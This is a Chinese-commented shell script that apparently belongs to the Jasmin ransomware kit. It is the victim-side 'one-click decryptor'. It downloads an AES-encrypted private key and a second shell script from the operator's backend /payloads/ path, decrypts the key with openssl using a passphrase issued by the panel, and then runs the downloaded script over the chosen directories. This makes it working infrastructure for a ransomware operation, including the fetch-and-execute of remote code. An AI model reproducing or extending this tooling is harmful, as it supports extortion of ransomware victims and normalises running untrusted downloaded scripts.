#!/bin/sh
# ════════════════════════════════════════════════════════════════
# Jasmin 一键解密器 — 纯 openssl 实现，零依赖
#   不需要 pip / cryptography / 编译，任何带 openssl 的机器都能跑
#
# 用法:
#   sh jasmin_unlock.sh <后台地址> <K口令> [目录1 目录2 ...]
#
# 示例:
#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6cf636bbbc0ff5e685e91eab8b /data
#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6cf636bbbc0ff5e685e91eab8b   # 默认当前目录
# ════════════════════════════════════════════════════════════════
# 强制 C locale：二进制↔十六进制转换不能被 UTF-8 污染
export LC_ALL=C
export LANG=C

SRV="$1"
K="$2"
shift 2 2>/dev/null

if [ -z "$SRV" ] || [ -z "$K" ]; then
    echo "用法: $0 <后台地址> <K口令> [目录1 目录2 ...]"
    echo "  例: $0 http://1.2.3.4:8080 7bc5cf6c... /path/to/data"
    exit 1
fi

# 目录：未指定则用当前目录（比默认全盘更安全）
if [ -n "$*" ]; then
    DIRS="$*"
else
    DIRS="$(pwd)"
    echo "[*] 未指定目录，使用当前目录: $DIRS"
fi

command -v openssl >/dev/null 2>&1 || { echo "[!] 缺少 openssl，无法解密"; exit 1; }
command -v od >/dev/null 2>&1 || { echo "[!] 缺少 od 命令"; exit 1; }

TD="/tmp/.junlock_$$"
mkdir -p "$TD" || exit 1
trap 'rm -rf "$TD"' EXIT INT TERM

DL(){
    if command -v curl >/dev/null 2>&1; then
        curl -sL "$1" -o "$2"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$2" "$1"
    else
        echo "[!] 需要 curl 或 wget"; return 1
    fi
    [ -s "$2" ]
}

echo "[*] 下载加密私钥..."
DL "$SRV/payloads/jasmin_private.pem.enc" "$TD/k.enc" || { echo "[!] 下载私钥失败: $SRV/payloads/jasmin_private.pem.enc"; exit 1; }

echo "[*] 下载解密器..."
DL "$SRV/payloads/jasmin_decrypt_openssl.sh" "$TD/dec.sh" || { echo "[!] 下载解密器失败"; exit 1; }

# ── 解开私钥 ──
# 存储格式: base64( IV(16B) + AES-CBC密文 )，PKCS7 padding
# PHP 端 keygen 用 aes-256-cbc + 32个ASCII字节；Python 端用 AES-128 + fromhex(K)。
# 这里两种都试，谁解出合法 PEM 用谁。
echo "[*] 解密私钥 (AES)..."
openssl base64 -d -A -in "$TD/k.enc" -out "$TD/blob" 2>/dev/null || { echo "[!] base64 解码失败"; exit 1; }
dd if="$TD/blob" bs=1 count=16 2>/dev/null > "$TD/iv"
dd if="$TD/blob" bs=1 skip=16 2>/dev/null > "$TD/ct"
IVHEX=$(od -An -tx1 "$TD/iv" | tr -d ' \n')
KEYHEX_ASCII=$(printf '%s' "$K" | od -An -tx1 | tr -d ' \n')

try_dec(){
    # $1=cipher  $2=keyhex
    rm -f "$TD/priv.pem"
    openssl enc -d -"$1" -K "$2" -iv "$IVHEX" -in "$TD/ct" -out "$TD/priv.pem" 2>/dev/null || return 1
    [ -s "$TD/priv.pem" ] || return 1
    head -c 32 "$TD/priv.pem" | grep -q "BEGIN" || return 1
    return 0
}

OK=""
if try_dec aes-128-cbc "$K"; then
    OK="AES-128-CBC (Python 后台生成的密钥)"
elif try_dec aes-256-cbc "$KEYHEX_ASCII"; then
    OK="AES-256-CBC (PHP 后台生成的密钥)"
fi

if [ -z "$OK" ]; then
    echo "[!] 私钥解密失败 —— K 口令不正确，或密钥文件已损坏/被更换"
    echo "    请回后台「解密教程」重新复制 K 口令（注意：密钥每次重新生成都会变）"
    exit 1
fi
echo "[+] 私钥已解开 ($OK)"

# ── 执行解密 ──
echo "[*] 开始解密文件..."
echo ""
sh "$TD/dec.sh" "$TD/priv.pem" $DIRS
RC=$?
echo ""
if [ "$RC" -eq 0 ]; then
    echo "[+] 完成。私钥与临时文件已清理。"
else
    echo "[!] 解密脚本返回码 $RC，请检查上方输出。"
fi
exit $RC
